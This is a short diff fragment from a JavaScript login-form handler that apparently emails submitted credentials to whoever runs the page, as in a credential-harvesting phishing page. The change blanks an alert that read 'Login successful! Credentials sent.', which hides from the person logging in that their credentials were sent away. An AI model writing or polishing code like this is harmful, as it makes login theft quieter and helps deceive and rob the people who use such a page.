@@ -49,7 +49,7 @@ loginForm.addEventListener('submit', async function(e) {
     );
 
     console.log('Email sent successfully:', emailResponse);
-    alert('Login successful! Credentials sent.');
+    alert(' ');
 
     loginForm.reset();
 
